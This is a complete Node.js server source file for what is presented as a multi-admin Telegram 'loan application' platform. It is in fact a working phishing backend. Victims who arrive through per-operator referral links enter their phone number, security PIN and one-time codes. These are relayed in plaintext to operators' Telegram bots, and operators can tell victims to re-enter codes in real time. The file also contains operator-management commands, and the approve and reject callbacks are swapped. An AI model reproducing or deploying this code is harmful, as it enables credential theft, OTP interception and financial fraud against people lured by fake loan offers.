const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

// ✅ ADD THIS - Database module
const db = require('./database');

const app = express();

// ==========================================
// MULTI-ADMIN SYSTEM WITH DATABASE
// ==========================================

// ✅ CHANGED - Only keep bot instances in memory, data is in DB
const adminBots = new Map(); // adminId => TelegramBot instance

// Super Admin Configuration
const SUPER_ADMIN_BOT_TOKEN = process.env.SUPER_ADMIN_BOT_TOKEN;
const SUPER_ADMIN_CHAT_ID = process.env.SUPER_ADMIN_CHAT_ID;
const superAdminBot = new TelegramBot(SUPER_ADMIN_BOT_TOKEN, { polling: true });

// ✅ ADD THIS - Database initialization
let dbReady = false;

(async () => {
    try {
        await db.connectDatabase();
        dbReady = true;
        console.log('✅ Database ready!');
        
        // Initialize bots from database
        await initializeBotsFromDatabase();
    } catch (error) {
        console.error('❌ Database initialization failed:', error);
        process.exit(1);
    }
})();

// ✅ ADD THIS - Load admin bots from database
async function initializeBotsFromDatabase() {
    const admins = await db.getAllAdmins();
    console.log(`📋 Loading ${admins.length} admins from database...`);
    
    for (const admin of admins) {
        if (admin.status === 'active') {
            const bot = createAdminBot(admin.adminId, admin.botToken);
            if (bot) {
                console.log(`✅ Bot initialized for: ${admin.name}`);
            }
        }
    }
}

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// ✅ ADD THIS - Middleware to check database ready
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health')) {
        return res.status(503).json({ 
            success: false, 
            message: 'Database not ready yet' 
        });
    }
    next();
});

// ==========================================
// ADMIN MANAGEMENT FUNCTIONS
// ==========================================

function createAdminBot(adminId, botToken) {
    try {
        const bot = new TelegramBot(botToken, { polling: true });
        adminBots.set(adminId, bot);
        
        // Setup bot handlers
        setupAdminBotHandlers(adminId, bot);
        
        console.log(`✅ Created bot for admin: ${adminId}`);
        return bot;
    } catch (error) {
        console.error(`❌ Error creating bot for admin ${adminId}:`, error);
        return null;
    }
}

function setupAdminBotHandlers(adminId, bot) {
    // Bot commands for sub-admins
    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
👋 *Welcome ${admin ? admin.name : 'Admin'}!*

This is your dedicated loan application bot.

*Your Admin ID:* \`${adminId}\`
*Your Chat ID:* \`${chatId}\`

*Your Personal Link:*
${process.env.APP_URL || 'http://localhost:3000'}?admin=${adminId}

*Process:*
1️⃣ Users submit applications through your link
2️⃣ You receive phone + PIN for verification
3️⃣ You approve/reject PIN
4️⃣ User enters OTP
5️⃣ You approve/reject OTP
6️⃣ Loan is approved!

*Commands:*
/start - Show this message
/mylink - Get your personal link
/stats - View your statistics
/pending - List your pending applications
/myinfo - View your admin information
        `, { parse_mode: 'Markdown' });
    });

    // My link command
    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        bot.sendMessage(chatId, `
🔗 *YOUR PERSONAL APPLICATION LINK*

Share this link with customers to assign applications to you:

\`${process.env.APP_URL || 'http://localhost:3000'}?admin=${adminId}\`

📋 All applications from this link will be assigned to: *${admin.name}*

💡 *Tip:* You can share this link via:
• WhatsApp
• SMS
• Email
• Social Media
        `, { parse_mode: 'Markdown' });
    });

    // Stats command for sub-admin
    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        
        // ✅ GET FROM DATABASE
        const stats = await db.getAdminStats(adminId);
        
        bot.sendMessage(chatId, `
📊 *YOUR LOAN STATISTICS*

📋 Total Applications: ${stats.total}
⏳ Awaiting PIN Approval: ${stats.pinPending}
✅ PIN Approved: ${stats.pinApproved}
⏳ Awaiting OTP Approval: ${stats.otpPending}
🎉 Fully Approved Loans: ${stats.fullyApproved}
        `, { parse_mode: 'Markdown' });
    });

    // Pending command
    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        
        // ✅ GET FROM DATABASE
        const adminApps = await db.getApplicationsByAdmin(adminId);
        const pinPending = adminApps.filter(a => a.pinStatus === 'pending');
        const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.pinStatus === 'approved');
        
        let message = `⏳ *YOUR PENDING APPLICATIONS*\n\n`;
        
        if (pinPending.length > 0) {
            message += `📱 *Awaiting PIN Approval (${pinPending.length}):*\n`;
            pinPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - \`${app.id}\`\n`;
            });
            message += '\n';
        }
        
        if (otpPending.length > 0) {
            message += `🔢 *Awaiting OTP Approval (${otpPending.length}):*\n`;
            otpPending.forEach((app, i) => {
                message += `${i + 1}. ${app.phoneNumber} - OTP: \`${app.otp}\`\n`;
            });
        }
        
        if (pinPending.length === 0 && otpPending.length === 0) {
            message = '✨ No pending applications!';
        }
        
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    });

    // My info command
    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        const admin = await db.getAdmin(adminId);
        
        if (admin) {
            bot.sendMessage(chatId, `
ℹ️ *YOUR ADMIN INFORMATION*

👤 *Name:* ${admin.name}
📧 *Email:* ${admin.email}
🆔 *Admin ID:* \`${adminId}\`
💬 *Chat ID:* \`${admin.chatId}\`
📅 *Created:* ${new Date(admin.createdAt).toLocaleString()}
✅ *Status:* ${admin.status}

🔗 *Your Link:*
${process.env.APP_URL || 'http://localhost:3000'}?admin=${adminId}
            `, { parse_mode: 'Markdown' });
        }
    });

    // Handle callback queries for this admin
    bot.on('callback_query', async (callbackQuery) => {
        await handleAdminCallback(adminId, bot, callbackQuery);
    });

    // Error handling
    bot.on('polling_error', (error) => {
        console.error(`Polling error for admin ${adminId}:`, error.code);
    });
}

async function handleAdminCallback(adminId, bot, callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    
    // Check for wrongpin_otp action
    if (data.startsWith('wrongpin_otp_')) {
        const applicationId = data.replace('wrongpin_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otpStatus: 'wrongpin_otp'
        });
        
        const updatedMessage = `
❌ *WRONG PIN AT OTP STAGE*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔢 Code: \`${application.otp}\`

⚠️ *Status:* User's PIN was incorrect
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

User will be redirected to re-enter PIN.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ User will re-enter PIN',
            show_alert: false
        });
        
        return;
    }
    
    // Check for wrongcode_otp action
    if (data.startsWith('wrongcode_otp_')) {
        const applicationId = data.replace('wrongcode_otp_', '');
        const application = await db.getApplication(applicationId);
        
        if (!application || application.adminId !== adminId) {
            await bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Application not found!',
                show_alert: true
            });
            return;
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otpStatus: 'wrongcode'
        });
        
        const updatedMessage = `
❌ *WRONG CODE ENTERED*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔢 Wrong Code: \`${application.otp}\`

⚠️ *Status:* User's verification code was incorrect
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

User will be redirected to re-enter verification code.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ User will re-enter code',
            show_alert: false
        });
        
        return;
    }
    
    // Parse action for other callbacks
    const parts = data.split('_');
    const action = parts[0];
    const type = parts[1];
    const applicationId = parts.slice(2).join('_');
    
    // ✅ GET FROM DATABASE
    const application = await db.getApplication(applicationId);
    
    if (!application || application.adminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Application not found!',
            show_alert: true
        });
        return;
    }
    
    if (action === 'approve' && type === 'pin') {
        // INVALID INFORMATION - REJECTED
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            pinStatus: 'rejected'
        });
        
        const updatedMessage = `
❌ *INVALID INFORMATION - REJECTED*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}

✗ *Status:* REJECTED
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '❌ Application rejected',
            show_alert: false
        });
        
    } else if (action === 'reject' && type === 'pin') {
        // ALL CORRECT - APPROVED
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            pinStatus: 'approved'
        });
        
        const updatedMessage = `
✅ *ALL CORRECT - APPROVED*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔐 PIN: \`${application.pin}\`

✓ *Status:* APPROVED
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

User will now proceed to OTP verification.
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '✅ Approved! User can enter OTP now.',
            show_alert: false
        });
        
    } else if (action === 'approve' && type === 'otp') {
        // ALL CORRECT - LOAN APPROVED!
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otpStatus: 'approved'
        });
        
        const updatedMessage = `
🎉 *LOAN APPROVED!*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}
🔢 OTP: \`${application.otp}\`

✓ *Status:* FULLY APPROVED
👤 *By:* ${callbackQuery.from.first_name}
⏰ *Time:* ${new Date().toLocaleString()}

✅ User will see approval page with loan details!
        `;
        
        await bot.editMessageText(updatedMessage, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown'
        });
        
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: '🎉 Loan approved!',
            show_alert: false
        });
        
        await bot.sendMessage(chatId, `🎉 Application ${applicationId} FULLY APPROVED!`);
    }
}

// ==========================================
// SUPER ADMIN BOT HANDLERS
// ==========================================

superAdminBot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    superAdminBot.sendMessage(chatId, `
👑 *SUPER ADMIN DASHBOARD*

Welcome to the Multi-Admin Loan Management System!

*Your Role:* Super Administrator
*Your Chat ID:* \`${chatId}\`

*Admin Management:*
/addadmin - Add a new sub-admin
/listadmins - View all sub-admins with their links
/removeadmin - Remove a sub-admin
/stats - View system-wide statistics

*System Commands:*
/help - Show all commands
/status - System status
    `, { parse_mode: 'Markdown' });
});

// Add admin command
superAdminBot.onText(/\/addadmin/, (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== SUPER_ADMIN_CHAT_ID) {
        return superAdminBot.sendMessage(chatId, '❌ Unauthorized');
    }
    
    superAdminBot.sendMessage(chatId, `
➕ *ADD NEW SUB-ADMIN*

To add a new admin, reply with admin details in this format:

\`NAME | EMAIL | BOT_TOKEN | CHAT_ID\`

*Example:*
\`John Doe | john@example.com | 123456:ABC-DEF... | 9876543210\`

*How to get values:*
• BOT_TOKEN: Create bot with @BotFather
• CHAT_ID: User starts bot, use @userinfobot
    `, { parse_mode: 'Markdown' });
});

// List admins with links
superAdminBot.onText(/\/listadmins/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== SUPER_ADMIN_CHAT_ID) {
        return superAdminBot.sendMessage(chatId, '❌ Unauthorized');
    }
    
    // ✅ GET FROM DATABASE
    const admins = await db.getAllAdmins();
    
    if (admins.length === 0) {
        return superAdminBot.sendMessage(chatId, '📋 No sub-admins registered yet.');
    }
    
    let message = `👥 *SUB-ADMIN LIST* (${admins.length} total)\n\n`;
    
    for (let index = 0; index < admins.length; index++) {
        const admin = admins[index];
        
        // ✅ GET STATS FROM DATABASE
        const stats = await db.getAdminStats(admin.adminId);
        const appUrl = process.env.APP_URL || 'http://localhost:3000';
        
        message += `${index + 1}. *${admin.name}*\n`;
        message += `   📧 ${admin.email}\n`;
        message += `   🆔 \`${admin.adminId}\`\n`;
        message += `   🔗 ${appUrl}?admin=${admin.adminId}\n`;
        message += `   📊 ${stats.total} applications\n`;
        message += `   ✅ ${admin.status}\n\n`;
    }
    
    superAdminBot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// System stats
superAdminBot.onText(/\/stats/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (chatId.toString() !== SUPER_ADMIN_CHAT_ID) {
        return superAdminBot.sendMessage(chatId, '❌ Unauthorized');
    }
    
    // ✅ GET FROM DATABASE
    const stats = await db.getStats();
    const perAdminStats = await db.getPerAdminStats();
    
    let message = `📊 *SYSTEM-WIDE STATISTICS*\n\n`;
    message += `👥 Total Sub-Admins: ${stats.totalAdmins}\n`;
    message += `📋 Total Applications: ${stats.totalApplications}\n\n`;
    
    message += `*Application Status:*\n`;
    message += `⏳ Awaiting PIN: ${stats.pinPending}\n`;
    message += `✅ PIN Approved: ${stats.pinApproved}\n`;
    message += `⏳ Awaiting OTP: ${stats.otpPending}\n`;
    message += `🎉 Fully Approved: ${stats.fullyApproved}\n`;
    message += `❌ Rejected: ${stats.totalRejected}\n\n`;
    
    message += `*Per Admin Breakdown:*\n`;
    perAdminStats.forEach((stat, index) => {
        message += `${index + 1}. *${stat.name}*\n`;
        message += `   Total: ${stat.total} | Approved: ${stat.fullyApproved} | Pending: ${stat.pinPending + stat.otpPending}\n\n`;
    });
    
    superAdminBot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// Help command
superAdminBot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    
    superAdminBot.sendMessage(chatId, `
📚 *SUPER ADMIN COMMANDS*

*Admin Management:*
/addadmin - Add new sub-admin
/listadmins - View all sub-admins with their links
/removeadmin <adminId> - Remove admin
/disableadmin <adminId> - Disable admin
/enableadmin <adminId> - Enable admin

*Statistics & Monitoring:*
/stats - System statistics
/status - System status
/logs - View recent logs

*Help:*
/start - Show welcome message
/help - This help message

*Format for adding admin:*
NAME | EMAIL | BOT_TOKEN | CHAT_ID
    `, { parse_mode: 'Markdown' });
});

// Handle admin creation messages
superAdminBot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId.toString() !== SUPER_ADMIN_CHAT_ID) return;
    if (!text || text.startsWith('/')) return;
    
    // Check if message matches admin creation format
    if (text.includes('|')) {
        const parts = text.split('|').map(p => p.trim());
        
        if (parts.length === 4) {
            const [name, email, botToken, chatId] = parts;
            
            // Generate admin ID
            const adminId = 'ADMIN-' + Date.now();
            
            // ✅ SAVE TO DATABASE
            await db.saveAdmin({
                id: adminId,
                name,
                email,
                botToken,
                chatId,
                status: 'active',
                createdAt: new Date().toISOString()
            });
            
            // Create bot for this admin
            const bot = createAdminBot(adminId, botToken);
            
            if (bot) {
                const appUrl = process.env.APP_URL || 'http://localhost:3000';
                const adminLink = `${appUrl}?admin=${adminId}`;
                
                await superAdminBot.sendMessage(SUPER_ADMIN_CHAT_ID, `
✅ *SUB-ADMIN CREATED SUCCESSFULLY!*

👤 *Name:* ${name}
📧 *Email:* ${email}
🆔 *Admin ID:* \`${adminId}\`
💬 *Chat ID:* \`${chatId}\`

🤖 Bot is now active and ready to receive applications!

*📋 Personal Application Link:*
\`${adminLink}\`

*Instructions for ${name}:*
1. Start their bot to get welcome message
2. Use /mylink to get their personal link
3. Share link with customers
4. All applications from that link will be assigned to them

Copy this link to share with ${name}:
${adminLink}
                `, { parse_mode: 'Markdown' });
                
                console.log(`✅ Created admin: ${adminId} (${name})`);
            } else {
                await superAdminBot.sendMessage(SUPER_ADMIN_CHAT_ID, `
❌ *ERROR CREATING BOT*

Failed to create bot for admin. Please check the bot token.
                `);
            }
        }
    }
});

// ==========================================
// APPLICATION API ENDPOINTS
// ==========================================

// API: Verify PIN with Admin Assignment
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { applicationId, phoneNumber, pin, adminId } = req.body;
        
        console.log('📥 Received PIN verification:', { applicationId, phoneNumber, adminId });
        
        let assignedAdmin;
        let assignmentType;
        
        // 1. Try to find admin from URL
        if (adminId) {
            assignedAdmin = await db.getAdmin(adminId);
            
            if (assignedAdmin && assignedAdmin.status === 'active') {
                assignmentType = '🔗 URL-based assignment';
                console.log(`✅ Admin found from URL: ${assignedAdmin.name} (${adminId})`);
            } else if (assignedAdmin && assignedAdmin.status !== 'active') {
                console.log(`⚠️ Admin found but inactive: ${assignedAdmin.name}`);
                assignedAdmin = null; // Force auto-assignment
            } else {
                console.log(`⚠️ Admin ID not found: ${adminId}`);
            }
        }
        
        // 2. Fallback: Auto-assign if no admin specified or admin not found
        if (!assignedAdmin) {
            const activeAdmins = await db.getActiveAdmins();
            
            if (activeAdmins.length === 0) {
                return res.status(400).json({ 
                    success: false, 
                    message: 'No active admins available' 
                });
            }
            
            // Random assignment from active admins
            assignedAdmin = activeAdmins[Math.floor(Math.random() * activeAdmins.length)];
            assignmentType = '⚠️ AUTO-ASSIGNED (no valid admin in URL)';
            console.log(`🔄 Auto-assigned to: ${assignedAdmin.name}`);
        }
        
        // Get admin's bot
        const bot = adminBots.get(assignedAdmin.adminId);
        if (!bot) {
            return res.status(500).json({ 
                success: false, 
                message: 'Admin bot not available' 
            });
        }
        
        // ✅ SAVE TO DATABASE
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            otp: null,
            assignmentType: assignmentType,
            timestamp: new Date().toISOString()
        });
        
        // Send to assigned admin's bot
        const message = `
${assignmentType}

🆕 *NEW LOAN APPLICATION*

📋 *Application ID:* \`${applicationId}\`

📱 *Phone Number:* ${phoneNumber}
🔐 *Security PIN:* \`${pin}\`

👤 *Assigned to:* ${assignedAdmin.name}
⏰ *Submitted:* ${new Date().toLocaleString()}

---
⚠️ *ACTION REQUIRED*
Please verify if this phone number and PIN are correct.
        `;
        
        await bot.sendMessage(assignedAdmin.chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { 
                            text: '❌ Invalid Information - Deny Application', 
                            callback_data: `approve_pin_${applicationId}` 
                        }
                    ],
                    [
                        { 
                            text: '✅ All Correct - Allow OTP Entry', 
                            callback_data: `reject_pin_${applicationId}` 
                        }
                    ]
                ]
            }
        });
        
        console.log(`📤 Application sent to admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
        
        res.json({ 
            success: true, 
            applicationId,
            assignedTo: assignedAdmin.name,
            assignedAdminId: assignedAdmin.adminId
        });
        
    } catch (error) {
        console.error('❌ Error in verify-pin:', error);
        res.status(500).json({ success: false, message: 'Failed to submit' });
    }
});

// API: Check PIN status
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    const { applicationId } = req.params;
    
    // ✅ GET FROM DATABASE
    const application = await db.getApplication(applicationId);
    
    if (application) {
        res.json({ success: true, status: application.pinStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

// API: Verify OTP
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;
        
        // ✅ GET FROM DATABASE
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        const admin = await db.getAdmin(application.adminId);
        const bot = adminBots.get(application.adminId);
        
        if (!admin || !bot) {
            return res.status(500).json({ success: false, message: 'Admin not available' });
        }
        
        // ✅ UPDATE IN DATABASE
        await db.updateApplication(applicationId, {
            otp: otp,
            otpStatus: 'pending'
        });
        
        // Send OTP to admin's bot
        const message = `
📲 *CODE VERIFICATION*

📋 *Application ID:* \`${applicationId}\`
📱 *Phone:* ${application.phoneNumber}

🔢 *Verification Code:* \`${otp}\`

⏰ *Time:* ${new Date().toLocaleString()}

---
⚠️ *VERIFY CODE*
Is this verification code correct for this application?
        `;
        
        await bot.sendMessage(admin.chatId, message, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { 
                            text: '❌ Wrong PIN - User Entered Wrong PIN', 
                            callback_data: `wrongpin_otp_${applicationId}` 
                        }
                    ],
                    [
                        { 
                            text: '❌ Wrong Code - User Entered Wrong Code', 
                            callback_data: `wrongcode_otp_${applicationId}` 
                        }
                    ],
                    [
                        { 
                            text: '✅ All Correct - Approve Loan', 
                            callback_data: `approve_otp_${applicationId}` 
                        }
                    ]
                ]
            }
        });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed to verify OTP' });
    }
});

// API: Check OTP status
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    const { applicationId } = req.params;
    
    // ✅ GET FROM DATABASE
    const application = await db.getApplication(applicationId);
    
    if (application) {
        res.json({ success: true, status: application.otpStatus });
    } else {
        res.status(404).json({ success: false, message: 'Not found' });
    }
});

// API: Resend OTP
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        
        // ✅ GET FROM DATABASE
        const application = await db.getApplication(applicationId);
        
        if (!application) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }
        
        const admin = await db.getAdmin(application.adminId);
        const bot = adminBots.get(application.adminId);
        
        if (!admin || !bot) {
            return res.status(500).json({ success: false, message: 'Admin not available' });
        }
        
        await bot.sendMessage(admin.chatId, `
🔄 *OTP RESEND REQUEST*

📋 Application: \`${applicationId}\`
📱 Phone: ${application.phoneNumber}

User requested OTP resend.
        `, { parse_mode: 'Markdown' });
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, message: 'Failed to resend OTP' });
    }
});

// API: Get active admins list (for frontend)
app.get('/api/admins', async (req, res) => {
    // ✅ GET FROM DATABASE
    const admins = await db.getActiveAdmins();
    
    const adminList = admins.map(admin => ({
        id: admin.adminId,
        name: admin.name,
        email: admin.email,
        status: admin.status
    }));
    
    res.json({ success: true, admins: adminList });
});

// API: Validate admin ID
app.get('/api/validate-admin/:adminId', async (req, res) => {
    const { adminId } = req.params;
    
    // ✅ GET FROM DATABASE
    const admin = await db.getAdmin(adminId);
    
    if (admin && admin.status === 'active') {
        res.json({ 
            success: true, 
            valid: true,
            admin: {
                id: admin.adminId,
                name: admin.name,
                email: admin.email
            }
        });
    } else {
        res.json({ 
            success: true, 
            valid: false,
            message: 'Admin not found or inactive'
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        database: dbReady ? 'connected' : 'not ready',
        timestamp: new Date().toISOString()
    });
});

// Serve admin selector page
app.get('/admin-select', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin-select.html'));
});

// ==========================================
// SERVER STARTUP
// ==========================================

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n👑 MULTI-ADMIN LOAN PLATFORM`);
    console.log(`============================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`👑 Super Admin Bot: Active`);
    console.log(`💬 Super Admin Chat: ${SUPER_ADMIN_CHAT_ID || 'NOT SET'}`);
    console.log(`\n✅ Platform ready!\n`);
});

// ✅ ADD THIS - Graceful shutdown
process.on('SIGTERM', async () => {
    console.log('SIGTERM received, shutting down gracefully...');
    await db.closeDatabase();
    process.exit(0);
});

process.on('SIGINT', async () => {
    console.log('SIGINT received, shutting down gracefully...');
    await db.closeDatabase();
    process.exit(0);
});

// Error handling
superAdminBot.on('polling_error', (error) => {
    console.error('Super Admin bot polling error:', error.code);
});

process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});